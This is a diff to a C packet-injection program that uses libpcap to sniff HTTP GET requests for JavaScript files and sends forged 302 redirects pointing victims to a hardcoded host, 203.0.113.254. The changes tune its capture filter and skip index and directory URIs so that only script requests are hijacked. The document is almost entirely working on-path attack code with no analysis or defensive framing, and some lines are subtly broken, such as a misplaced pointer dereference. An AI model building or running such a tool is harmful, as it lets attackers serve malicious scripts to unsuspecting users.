@@ -13,6 +13,7 @@
 #include <string.h>
 
 #define HTTP302 "HTTP/1.1 302 Found\r\n" "Connection: close\r\n" "Content-Length: 0\r\n" "Location: http://203.0.113.254/?%s%s\r\n"
+#define PCAPFILTER "dst port 80 and tcp and tcp[tcpflags] & tcp-push != 0"
 
 #ifdef DEBUG
 void print_packet(const u_char *packet);
@@ -39,14 +40,24 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 	const char* payload = (const char *)packet + ETHER_HDR_LEN + LIBNET_IPV4_H + LIBNET_TCP_H;
 	//const char* payload = (const char *)packet + 0x44 + LIBNET_IPV4_H + LIBNET_TCP_H;
 
+    /* Non-GET  */
     if(!((*payload) == 'G' && *(payload+1) == 'E')) {
 #ifdef DEBUG
-        fprintf(stderr, "Non HTTP GET\n");
+        fprintf(stderr, "Non HTTP GET, pass\n");
+#endif
+        return;
+    }
+
+    /* GET / HTTP/1.1\r\n  */
+    if((*payload+5) == ' ') {
+#ifdef DEBUG
+        fprintf(stderr, "Index GET, pass\n");
 #endif
         return;
     }
 
     _get = memchr(payload, '\r', 100);
+
     if (_get == NULL) {
 #ifdef DEBUG
         fprintf(stderr, "URI Longer than 100, pass\n");
@@ -55,6 +66,14 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
     }
 
     get_pos = _get - payload;
+
+    if (*(payload+get_pos-1) == '/') {
+#ifdef DEBUG
+        fprintf(stderr, "Diretory URI, pass\n");
+#endif
+        return;
+    }
+
     memcpy(http_get, payload+4, get_pos-13);
 
     size_t urllen = strlen(http_get);
@@ -65,7 +84,6 @@ get_packet(uint8_t *args, const struct pcap_pkthdr *header, const uint8_t *packe
 #ifdef DEBUG
         fprintf(stderr, "URI not ends with .js\n");
 #endif
-
         if(strstr(http_get, ".js?") == NULL) {
 #ifdef DEBUG
         fprintf(stderr, "URI not match .js at all, pass\n");
@@ -107,6 +125,7 @@ int main(int argc, char* argv[]) {
 pcap_t *init_pcap_handle(const char* dev) {
 	//char *dev = "eth0";
 	char errbuf[PCAP_ERRBUF_SIZE];
+	struct bpf_program fp;
 
 //	dev = pcap_lookupdev(errbuf);
 	if (dev == NULL) {
@@ -123,24 +142,7 @@ pcap_t *init_pcap_handle(const char* dev) {
 		exit(EXIT_FAILURE);
 	}
 
-	struct bpf_program fp;
-	char filter[1024];
-
-    /*
-	sprintf(filter,
-		"(src host %s) and (tcp src port %s) and (dst host %s) and (tcp dst port %s)\
-			and (tcp[tcpflags] & tcp-ack != 0)", 
-			server_ip, server_port, client_ip, client_port);
-
-    */
-
-    sprintf(filter, "tcp && dst port 80 && tcp[tcpflags] & tcp-push != 0");
-
-#ifdef DEBUG
-	fprintf(stderr, "Prepared filter: %s\n", filter);
-#endif
-
-	if (pcap_compile(handle, &fp, filter, 1, 0) == -1) {
+	if (pcap_compile(handle, &fp, PCAPFILTER, 1, 0) == -1) {
 		fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(handle));
 		exit(EXIT_FAILURE);
 	}
@@ -151,7 +153,6 @@ pcap_t *init_pcap_handle(const char* dev) {
 	}
 
 	pcap_freecode(&fp);
-
 	return handle;
 }
 
